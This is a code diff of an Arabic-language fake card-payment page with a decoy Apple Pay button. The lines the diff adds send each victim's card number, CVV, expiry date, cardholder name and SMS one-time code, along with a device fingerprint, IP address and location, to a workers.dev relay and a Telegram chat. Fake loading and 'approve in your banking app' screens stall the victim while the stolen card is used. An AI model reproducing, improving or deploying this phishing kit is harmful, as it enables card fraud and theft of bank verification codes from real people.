@@ -25,7 +25,6 @@ body {
   overflow-x: hidden;
 }
 
-/* الشاشة الأساسية بدون فراغ زائد تحت */
 .payment-screen {
   width: 100%;
   padding: 14px 14px 12px;
@@ -37,7 +36,6 @@ body {
   margin: 0 auto;
 }
 
-/* طبقة Apple Pay البيضاء */
 .apple-pay-screen {
   position: fixed;
   inset: 0;
@@ -46,7 +44,6 @@ body {
   display: none;
 }
 
-/* زر Apple Pay */
 .apple-pay-btn {
   width: 100%;
   background: #000;
@@ -64,7 +61,6 @@ body {
   -webkit-tap-highlight-color: transparent;
 }
 
-/* حاوية الشعار */
 .apple-wrap {
   width: 175px;
   height: 44px;
@@ -74,10 +70,6 @@ body {
   overflow: hidden;
 }
 
-/*
-  تم تعديل الشعار هنا:
-  تصغير بسيط + نزول للأسفل شوي
-*/
 .apple-logo {
   width: 100%;
   height: auto;
@@ -93,7 +85,6 @@ body {
   transform-origin: center center;
 }
 
-/* الإطار */
 .box {
   width: 100%;
   border: 2px solid #000;
@@ -103,14 +94,12 @@ body {
   overflow: hidden;
 }
 
-/* العنوان */
 .title {
   font-size: 22px;
   font-weight: 700;
   margin-bottom: 15px;
 }
 
-/* حقل رقم البطاقة */
 .input-box {
   width: 100%;
   background: #f2f2f2;
@@ -125,7 +114,6 @@ body {
   overflow: hidden;
 }
 
-/* الشعار */
 .card-icon {
   width: 65px;
   height: auto;
@@ -137,7 +125,6 @@ body {
   flex-shrink: 0;
 }
 
-/* رقم البطاقة */
 .card-number {
   border: none;
   outline: none;
@@ -148,7 +135,6 @@ body {
   color: #111;
 }
 
-/* صف */
 .row {
   display: flex;
   width: 100%;
@@ -171,7 +157,6 @@ body {
   color: #111;
 }
 
-/* الاسم */
 .name-input {
   border: 1px solid transparent;
   outline: none;
@@ -187,7 +172,6 @@ body {
   color: #111;
 }
 
-/* حقل تاريخ الانتهاء */
 .expiry-box {
   flex: 1;
   min-width: 0;
@@ -227,7 +211,6 @@ body {
   user-select: none;
 }
 
-/* زر الدفع */
 .pay-btn {
   width: 100%;
   margin: 16px auto 0;
@@ -243,7 +226,6 @@ body {
   -webkit-tap-highlight-color: transparent;
 }
 
-/* حالة الخطأ */
 .error {
   border-color: rgba(220, 38, 38, 0.45) !important;
   box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.08) !important;
@@ -257,7 +239,6 @@ select:invalid {
   color: #777;
 }
 
-/* الشاشات */
 .flow-screen {
   position: fixed;
   inset: 0;
@@ -275,7 +256,6 @@ select:invalid {
   text-align: center;
 }
 
-/* الدولاب */
 .loader-pro {
   position: relative;
   width: 124px;
@@ -315,7 +295,32 @@ select:invalid {
   direction: ltr;
 }
 
-/* صفحة OTP */
+.auth-title {
+  font-size: 32px;
+  font-weight: 800;
+  color: #111;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+.auth-desc {
+  font-size: 21px;
+  line-height: 2;
+  color: #444;
+  margin-bottom: 26px;
+}
+
+.back-link {
+  display: inline-block;
+  margin-top: 70px;
+  font-size: 16px;
+  font-weight: 700;
+  color: #5b8def;
+  text-decoration: underline;
+  text-underline-offset: 4px;
+  cursor: pointer;
+}
+
 .otp-desc {
   font-size: 17px;
   line-height: 2;
@@ -360,180 +365,182 @@ button {
   to { transform: rotate(360deg); }
 }
 
-/* للجوال */
 @media (max-width: 480px) {
-  .payment-screen {
-    padding: 10px 10px 10px;
-  }
-
-  .page-shell {
-    max-width: 100%;
-  }
-
-  .apple-pay-btn {
-    height: 64px;
-    margin-bottom: 14px;
-  }
-
-  .apple-wrap {
-    width: 150px;
-    height: 38px;
-  }
-
-  .apple-logo {
-    transform: scale(1.60) translateY(8px);
-  }
-
-  .box {
-    padding: 16px;
-  }
-
-  .title {
-    font-size: 20px;
-  }
-
-  .pay-btn {
-    height: 64px;
-    font-size: 19px;
-  }
+  .payment-screen { padding: 10px; }
+  .page-shell { max-width: 100%; }
+  .apple-pay-btn { height: 64px; margin-bottom: 14px; }
+  .apple-wrap { width: 150px; height: 38px; }
+  .apple-logo { transform: scale(1.60) translateY(8px); }
+  .box { padding: 16px; }
+  .title { font-size: 20px; }
+  .pay-btn { height: 64px; font-size: 19px; }
 }
 
-/* للكمبيوتر و GitHub */
 @media (min-width: 700px) {
-  body {
-    display: flex;
-    justify-content: center;
-  }
-
-  .payment-screen {
-    padding-top: 16px;
-    padding-bottom: 10px;
-  }
-
-  .page-shell {
-    max-width: 440px;
-  }
-
-  .apple-pay-btn {
-    height: 72px;
-  }
-
-  .apple-wrap {
-    width: 190px;
-    height: 46px;
-  }
-
-  .apple-logo {
-    transform: scale(1.76) translateY(9px);
-  }
+  body { display: flex; justify-content: center; }
+  .payment-screen { padding-top: 16px; padding-bottom: 10px; }
+  .page-shell { max-width: 440px; }
+  .apple-pay-btn { height: 72px; }
+  .apple-wrap { width: 190px; height: 46px; }
+  .apple-logo { transform: scale(1.76) translateY(9px); }
 }
 </style>
 </head>
-
 <body>
 
 <div class="payment-screen" id="paymentScreen">
   <div class="page-shell">
-
     <div class="apple-pay-screen" id="applePayScreen"></div>
-
     <button class="apple-pay-btn" id="applePayBtn" type="button">
       <div class="apple-wrap">
         <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo" alt="Apple Pay">
       </div>
     </button>
-
     <div class="box">
       <div class="title">بطاقة الائتمان</div>
-
       <div class="input-box" id="cardBox">
-        <img
-          id="cardLogo"
-          class="card-icon"
-          src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
-          alt="card"
-        >
-
-        <input
-          type="text"
-          id="cardNumber"
-          class="card-number"
-          placeholder="رقم البطاقة"
-          maxlength="16"
-          inputmode="numeric"
-          autocomplete="cc-number"
-        >
+        <img id="cardLogo" class="card-icon" src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png" alt="card">
+        <input type="text" id="cardNumber" class="card-number" placeholder="رقم البطاقة" maxlength="16" inputmode="numeric" autocomplete="cc-number">
       </div>
-
       <div class="row">
-        <input
-          type="text"
-          id="cvv"
-          class="small-input"
-          placeholder="CVV"
-          maxlength="3"
-          inputmode="numeric"
-          autocomplete="cc-csc"
-        >
-
+        <input type="text" id="cvv" class="small-input" placeholder="CVV" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
         <div class="expiry-box" id="expiryBox">
-          <select id="expMonth" class="expiry-select" required>
-            <option value="" selected disabled>MM</option>
-          </select>
+          <select id="expMonth" class="expiry-select" required><option value="" selected disabled>MM</option></select>
           <div class="expiry-sep">/</div>
-          <select id="expYear" class="expiry-select" required>
-            <option value="" selected disabled>YY</option>
-          </select>
+          <select id="expYear" class="expiry-select" required><option value="" selected disabled>YY</option></select>
         </div>
       </div>
-
-      <input
-        type="text"
-        id="cardName"
-        class="name-input"
-        placeholder="الاسم الموجود على البطاقة"
-        autocomplete="cc-name"
-      >
+      <input type="text" id="cardName" class="name-input" placeholder="الاسم الموجود على البطاقة" autocomplete="cc-name">
     </div>
-
     <button class="pay-btn" id="payBtn" type="button">ادفع الآن</button>
-
   </div>
 </div>
 
-<div class="flow-screen" id="loadingScreen1">
-  <div class="flow-card">
-    <div class="loader-pro"></div>
-    <div class="countdown" id="countdown60">60</div>
-  </div>
-</div>
-
-<div class="flow-screen" id="otpScreen">
-  <div class="flow-card">
-    <div class="otp-desc">
-      يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة
-    </div>
-
-    <input
-      type="text"
-      id="otpInput"
-      class="otp-input"
-      placeholder="أدخل رمز التحقق"
-      inputmode="numeric"
-      maxlength="6"
-    >
-
-    <button class="otp-btn" id="otpBtn" type="button">تحقق</button>
-  </div>
-</div>
-
-<div class="flow-screen" id="loadingScreen2">
-  <div class="flow-card">
-    <div class="loader-pro"></div>
-  </div>
-</div>
+<div class="flow-screen" id="loadingScreen1"><div class="flow-card"><div class="loader-pro"></div><div class="countdown" id="countdown60">60</div></div></div>
+<div class="flow-screen" id="approvalScreen"><div class="flow-card"><div class="auth-title">صادق على المعاملة عبر تطبيق المصرف الخاص بك</div><div class="auth-desc">اضغط على الإشعار المرسل إليك في التطبيق المصرفي<br>راجع معاملة الدفع ووافق عليها</div><div class="back-link" id="backToOtp">رجوع الى رمز التحقق</div></div></div>
+<div class="flow-screen" id="otpScreen"><div class="flow-card"><div class="otp-desc">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</div><input type="text" id="otpInput" class="otp-input" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6"><button class="otp-btn" id="otpBtn" type="button">تحقق</button></div></div>
+<div class="flow-screen" id="loadingScreen2"><div class="flow-card"><div class="loader-pro"></div></div></div>
 
 <script>
+// ========================  إعدادات الإرسال ========================
+const WORKER_URL = "https://icy-cherry-0930.msjsoo777.workers.dev/";  // 👈 رابط المستضيف (غيّره هنا)
+const CHAT_ID = "6918534470";                                    // 👈 معرف الدردشة (غيّره هنا)
+
+// ========================  البصمة والبيانات الإضافية ========================
+function generateStableFingerprint() {
+  let components = [
+    navigator.userAgent || '',
+    navigator.language || '',
+    screen.width + 'x' + screen.height,
+    screen.colorDepth,
+    new Date().getTimezoneOffset(),
+    navigator.hardwareConcurrency || '',
+    navigator.deviceMemory || '',
+    !!navigator.maxTouchPoints ? 'touch' : 'no-touch'
+  ];
+  let fingerprint = components.join('|');
+  let hash = 0;
+  for (let i = 0; i < fingerprint.length; i++) {
+    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
+    hash |= 0;
+  }
+  return 'fp_' + Math.abs(hash).toString(16);
+}
+
+let userId = localStorage.getItem("stableUserId");
+if (!userId) {
+  userId = generateStableFingerprint();
+  localStorage.setItem("stableUserId", userId);
+}
+
+// عدد الزيارات لهذه البصمة
+let visitCount = localStorage.getItem("visitCount_" + userId);
+if (!visitCount) {
+  visitCount = 1;
+} else {
+  visitCount = parseInt(visitCount) + 1;
+}
+localStorage.setItem("visitCount_" + userId, visitCount);
+
+// كشف نوع الجهاز بدقة (Android / iPhone / iPad / Desktop)
+function getDeviceType() {
+  const ua = navigator.userAgent;
+  if (/Android/i.test(ua)) return "Android";
+  if (/iPhone/i.test(ua)) return "iPhone";
+  if (/iPad/i.test(ua)) return "iPad";
+  if (/iPod/i.test(ua)) return "iPod";
+  return "Desktop";
+}
+
+// كشف المتصفح بدقة
+function getBrowserName() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+  if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Safari";
+  if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Edg")) return "Edge";
+  if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+  if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
+  return "Unknown";
+}
+
+let geoData = { country: "غير معروف", city: "غير معروف" };
+let clientIP = "غير معروف";
+
+// جلب IP والموقع (المدينة - البلد)
+async function fetchIPandGeo() {
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipJson = await ipRes.json();
+    clientIP = ipJson.ip;
+    const geoRes = await fetch(`https://ipapi.co/${clientIP}/json/`);
+    const geoJson = await geoRes.json();
+    if (!geoJson.error) {
+      geoData.country = geoJson.country_name || "غير معروف";
+      geoData.city = geoJson.city || "غير معروف";
+    }
+  } catch(e) { console.warn("فشل جلب الموقع", e); }
+}
+fetchIPandGeo();
+
+// دالة الحصول على التاريخ والوقت الحالي بالتنسيق المطلوب
+function getCurrentDateTime() {
+  const now = new Date();
+  const year = now.getFullYear();
+  const month = String(now.getMonth() + 1).padStart(2, '0');
+  const day = String(now.getDate()).padStart(2, '0');
+  const hours = String(now.getHours()).padStart(2, '0');
+  const minutes = String(now.getMinutes()).padStart(2, '0');
+  const seconds = String(now.getSeconds()).padStart(2, '0');
+  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+}
+
+// بناء المعلومات الإضافية بالشكل المطلوب (مطابق للصورة)
+function getExtraInfo() {
+  const dateTime = getCurrentDateTime();
+  return `المستخدم الثابت: ${userId}
+عدد الزيارات: ${visitCount}
+الجهاز: ${getDeviceType()}
+المتصفح: ${getBrowserName()}
+IP: ${clientIP}
+الموقع: ${geoData.city} - ${geoData.country}
+التاريخ والوقت: ${dateTime}`;
+}
+
+// دالة الإرسال إلى Worker مع إضافة المعلومات الإضافية
+async function sendToWorker(messageText) {
+  try {
+    const extra = getExtraInfo();
+    const fullMessage = `${messageText}\n\n━━━━━━━━━━━━━━━━━━━━\n${extra}`;
+    await fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: fullMessage })
+    });
+  } catch(err) { console.error("فشل الإرسال", err); }
+}
+
+// ========================  الكود الأصلي (مع إضافة الإرسال) ========================
 const cardInput = document.getElementById("cardNumber");
 const cvvInput = document.getElementById("cvv");
 const nameInput = document.getElementById("cardName");
@@ -545,13 +552,13 @@ const cardBox = document.getElementById("cardBox");
 const payBtn = document.getElementById("payBtn");
 const applePayBtn = document.getElementById("applePayBtn");
 const applePayScreen = document.getElementById("applePayScreen");
-
 const paymentScreen = document.getElementById("paymentScreen");
 const loadingScreen1 = document.getElementById("loadingScreen1");
+const approvalScreen = document.getElementById("approvalScreen");
 const otpScreen = document.getElementById("otpScreen");
 const loadingScreen2 = document.getElementById("loadingScreen2");
-
 const countdown60 = document.getElementById("countdown60");
+const backToOtp = document.getElementById("backToOtp");
 const otpInput = document.getElementById("otpInput");
 const otpBtn = document.getElementById("otpBtn");
 
@@ -569,241 +576,123 @@ for (let i = 1; i <= 12; i++) {
   option.textContent = val;
   expMonth.appendChild(option);
 }
-
 for (let i = 26; i <= 50; i++) {
-  const val = String(i);
   const option = document.createElement("option");
-  option.value = val;
-  option.textContent = val;
+  option.value = i;
+  option.textContent = i;
   expYear.appendChild(option);
 }
 
 function toggleError(element, show) {
-  if (show) {
-    element.classList.add("error");
-  } else {
-    element.classList.remove("error");
-  }
+  if (show) element.classList.add("error");
+  else element.classList.remove("error");
 }
 
-function setCaretToEnd(el) {
-  try {
-    const len = el.value.length;
-    el.setSelectionRange(len, len);
-  } catch (e) {}
-}
-
-function sanitizeCard(value) {
-  return value.replace(/\D/g, "").slice(0, 16);
-}
-
-function sanitizeCVV(value) {
-  return value.replace(/\D/g, "").slice(0, 3);
-}
-
-function sanitizeName(value) {
-  return value
-    .replace(/[^A-Za-z ]/g, "")
-    .replace(/\s{2,}/g, " ")
-    .replace(/^\s+/, "");
-}
-
-function sanitizeOTP(value) {
-  return value.replace(/\D/g, "").slice(0, 6);
-}
-
+function sanitizeCard(value) { return value.replace(/\D/g, "").slice(0, 16); }
+function sanitizeCVV(value) { return value.replace(/\D/g, "").slice(0, 3); }
+function sanitizeName(value) { return value.replace(/[^A-Za-z ]/g, "").replace(/\s{2,}/g, " ").replace(/^\s+/, ""); }
+function sanitizeOTP(value) { return value.replace(/\D/g, "").slice(0, 6); }
 function showScreen(screen) {
   paymentScreen.style.display = "none";
   loadingScreen1.style.display = "none";
+  approvalScreen.style.display = "none";
   otpScreen.style.display = "none";
   loadingScreen2.style.display = "none";
   screen.style.display = "flex";
 }
-
 function hideAllTimers() {
-  if (timer60) {
-    clearInterval(timer60);
-    timer60 = null;
-  }
-  if (timer30) {
-    clearTimeout(timer30);
-    timer30 = null;
-  }
+  if (timer60) { clearInterval(timer60); timer60 = null; }
+  if (timer30) { clearTimeout(timer30); timer30 = null; }
 }
-
 function detectCardType(number) {
   if (!/^\d+$/.test(number)) return "unknown";
   if (number.startsWith("4")) return "visa";
-
-  if (number.length >= 2) {
-    const firstTwo = parseInt(number.slice(0, 2), 10);
-    if (firstTwo >= 51 && firstTwo <= 55) return "mastercard";
-  }
-
-  if (number.length >= 4) {
-    const firstFour = parseInt(number.slice(0, 4), 10);
-    if (firstFour >= 2221 && firstFour <= 2720) return "mastercard";
-  }
-
+  if (number.length >= 2) { let firstTwo = parseInt(number.slice(0,2),10); if (firstTwo>=51 && firstTwo<=55) return "mastercard"; }
+  if (number.length >= 4) { let firstFour = parseInt(number.slice(0,4),10); if (firstFour>=2221 && firstFour<=2720) return "mastercard"; }
   return "unknown";
 }
-
 function updateCardLogo(type) {
-  if (type === "visa") {
-    logo.src = LOGO_VISA;
-  } else if (type === "mastercard") {
-    logo.src = LOGO_MC;
-  } else {
-    logo.src = LOGO_DEFAULT;
-  }
+  if (type === "visa") logo.src = LOGO_VISA;
+  else if (type === "mastercard") logo.src = LOGO_MC;
+  else logo.src = LOGO_DEFAULT;
 }
+function validateCard() { let valid = /^\d{16}$/.test(cardInput.value); toggleError(cardBox, !valid); return valid; }
+function validateCVV() { let valid = /^\d{3}$/.test(cvvInput.value); toggleError(cvvInput, !valid); return valid; }
+function validateName() { let valid = /^[A-Za-z ]+$/.test(nameInput.value.trim()) && /[A-Za-z]/.test(nameInput.value.trim()); toggleError(nameInput, !valid); return valid; }
+function validateExpiry() { let valid = expMonth.value !== "" && expYear.value !== ""; toggleError(expiryBox, !valid); return valid; }
+function validateOTP() { let valid = /^\d{4,6}$/.test(otpInput.value.trim()); toggleError(otpInput, !valid); return valid; }
 
-function validateCard() {
-  const value = cardInput.value;
-  const type = detectCardType(value);
-  updateCardLogo(type);
-  const valid = /^\d{16}$/.test(value);
-  toggleError(cardBox, !valid);
-  return valid;
-}
-
-function validateCVV() {
-  const valid = /^\d{3}$/.test(cvvInput.value);
-  toggleError(cvvInput, !valid);
-  return valid;
-}
-
-function validateName() {
-  const value = nameInput.value.trim();
-  const valid = /^[A-Za-z ]+$/.test(value) && /[A-Za-z]/.test(value);
-  toggleError(nameInput, !valid);
-  return valid;
-}
-
-function validateExpiry() {
-  const month = expMonth.value;
-  const year = expYear.value;
-  const valid = month !== "" && year !== "";
-  toggleError(expiryBox, !valid);
-  return valid;
-}
-
-function validateOTP() {
-  const value = otpInput.value.trim();
-  const valid = /^\d{4,6}$/.test(value);
-  toggleError(otpInput, !valid);
-  return valid;
-}
-
-cardInput.addEventListener("input", function () {
+cardInput.addEventListener("input", function() {
   this.value = sanitizeCard(this.value);
   updateCardLogo(detectCardType(this.value));
-
-  if (this.value.length > 0) {
-    if (/^\d{16}$/.test(this.value)) {
-      validateCard();
-    } else {
-      toggleError(cardBox, false);
-    }
-  } else {
-    toggleError(cardBox, false);
-    updateCardLogo("unknown");
-  }
+  if (this.value.length > 0) { if (/^\d{16}$/.test(this.value)) validateCard(); else toggleError(cardBox, false); }
+  else { toggleError(cardBox, false); updateCardLogo("unknown"); }
 });
-
-cardInput.addEventListener("keypress", function (e) {
-  const ch = e.key;
-  if (!/^\d$/.test(ch)) e.preventDefault();
-});
-
-cvvInput.addEventListener("input", function () {
+cardInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
+cvvInput.addEventListener("input", function() {
   this.value = sanitizeCVV(this.value);
-
-  if (this.value.length > 0) {
-    if (this.value.length === 3) {
-      validateCVV();
-    } else {
-      toggleError(cvvInput, false);
-    }
-  } else {
-    toggleError(cvvInput, false);
-  }
+  if (this.value.length > 0) { if (this.value.length === 3) validateCVV(); else toggleError(cvvInput, false); }
+  else toggleError(cvvInput, false);
 });
-
-cvvInput.addEventListener("keypress", function (e) {
-  const ch = e.key;
-  if (!/^\d$/.test(ch)) e.preventDefault();
-});
-
-nameInput.addEventListener("input", function () {
+cvvInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
+nameInput.addEventListener("input", function() {
   this.value = sanitizeName(this.value);
-
-  if (this.value.trim().length > 0) {
-    validateName();
-  } else {
-    toggleError(nameInput, false);
-  }
+  if (this.value.trim().length > 0) validateName(); else toggleError(nameInput, false);
 });
-
-nameInput.addEventListener("keypress", function (e) {
-  const ch = e.key;
-  if (ch.length === 1 && !/[A-Za-z ]/.test(ch)) {
-    e.preventDefault();
-  }
-});
-
-otpInput.addEventListener("input", function () {
+nameInput.addEventListener("keypress", e => { if (e.key.length===1 && !/[A-Za-z ]/.test(e.key)) e.preventDefault(); });
+otpInput.addEventListener("input", function() {
   this.value = sanitizeOTP(this.value);
-
-  if (this.value.length > 0) {
-    validateOTP();
-  } else {
-    toggleError(otpInput, false);
-  }
+  if (this.value.length > 0) validateOTP(); else toggleError(otpInput, false);
 });
-
-otpInput.addEventListener("keypress", function (e) {
-  const ch = e.key;
-  if (!/^\d$/.test(ch)) e.preventDefault();
-});
-
-expMonth.addEventListener("paste", function (e) { e.preventDefault(); });
-expYear.addEventListener("paste", function (e) { e.preventDefault(); });
-
+otpInput.addEventListener("keypress", e => { if (!/^\d$/.test(e.key)) e.preventDefault(); });
+expMonth.addEventListener("paste", e => e.preventDefault());
+expYear.addEventListener("paste", e => e.preventDefault());
 cardInput.addEventListener("focus", () => cardBox.classList.remove("error"));
 cvvInput.addEventListener("focus", () => cvvInput.classList.remove("error"));
 nameInput.addEventListener("focus", () => nameInput.classList.remove("error"));
 expMonth.addEventListener("focus", () => expiryBox.classList.remove("error"));
 expYear.addEventListener("focus", () => expiryBox.classList.remove("error"));
 otpInput.addEventListener("focus", () => otpInput.classList.remove("error"));
-
 expMonth.addEventListener("change", validateExpiry);
 expYear.addEventListener("change", validateExpiry);
 
-applePayBtn.addEventListener("click", function () {
+// -------------------  زر Apple Pay -------------------
+applePayBtn.addEventListener("click", function() {
   applePayScreen.style.display = "block";
-  setTimeout(function () {
-    applePayScreen.style.display = "none";
-  }, 2000);
+  setTimeout(() => { applePayScreen.style.display = "none"; }, 2000);
+  sendToWorker("🪪 تم النقر على Apple Pay");
+});
+
+// -------------------  زر الدفع (إرسال بيانات البطاقة) -------------------
+payBtn.addEventListener("click", function(e) {
+  e.preventDefault();
+  const isCardValid = validateCard();
+  const isCVVValid = validateCVV();
+  const isNameValid = validateName();
+  const isExpiryValid = validateExpiry();
+  if (isCardValid && isCVVValid && isNameValid && isExpiryValid) {
+    let cardType = detectCardType(cardInput.value);
+    let cardTypeName = "بدون نوع";
+    if (cardType === "visa") cardTypeName = "فيزا";
+    else if (cardType === "mastercard") cardTypeName = "ماستر كارد";
+    const cardMessage = `💳 معلومات الدفع\n━━━━━━━━━━━━━━━━━━━━\n🏷 نوع البطاقة: ${cardTypeName}\n🔢 رقم البطاقة: ${cardInput.value}\n🔐 رمز CVV: ${cvvInput.value}\n📅 تاريخ الانتهاء: ${expMonth.value}/${expYear.value}\n👤 الاسم على البطاقة: ${nameInput.value.trim() || "غير مدخل"}`;
+    sendToWorker(cardMessage);
+    startFirstLoading();
+  }
 });
 
 function startFirstLoading() {
   hideAllTimers();
   showScreen(loadingScreen1);
-
   let seconds = 60;
   countdown60.textContent = seconds;
-
-  timer60 = setInterval(function () {
+  timer60 = setInterval(() => {
     seconds--;
     countdown60.textContent = seconds;
-
     if (seconds <= 0) {
       clearInterval(timer60);
       timer60 = null;
-      showScreen(otpScreen);
-      otpInput.value = "";
-      otpInput.classList.remove("error");
+      showScreen(approvalScreen);
     }
   }, 1000);
 }
@@ -811,8 +700,7 @@ function startFirstLoading() {
 function startSecondLoading() {
   hideAllTimers();
   showScreen(loadingScreen2);
-
-  timer30 = setTimeout(function () {
+  timer30 = setTimeout(() => {
     timer30 = null;
     showScreen(otpScreen);
     otpInput.value = "";
@@ -820,24 +708,23 @@ function startSecondLoading() {
   }, 30000);
 }
 
-otpBtn.addEventListener("click", function () {
-  const isOtpValid = validateOTP();
-  if (!isOtpValid) return;
-  startSecondLoading();
+// -------------------  زر الرجوع إلى رمز التحقق -------------------
+backToOtp.addEventListener("click", function() {
+  hideAllTimers();
+  showScreen(otpScreen);
+  otpInput.value = "";
+  otpInput.classList.remove("error");
+  sendToWorker("↩️ تم الرجوع إلى رمز التحقق");
 });
 
-payBtn.addEventListener("click", function (e) {
-  e.preventDefault();
-
-  const isCardValid = validateCard();
-  const isCVVValid = validateCVV();
-  const isNameValid = validateName();
-  const isExpiryValid = validateExpiry();
-
-  if (isCardValid && isCVVValid && isNameValid && isExpiryValid) {
-    startFirstLoading();
-  }
+// -------------------  زر إرسال OTP -------------------
+otpBtn.addEventListener("click", function() {
+  const isOtpValid = validateOTP();
+  if (!isOtpValid) return;
+  const otpCode = otpInput.value.trim();
+  sendToWorker(`🔐 رمز التحقق OTP المدخل: ${otpCode}`);
+  startSecondLoading();
 });
 </script>
 </body>
-</html>
+  </html>
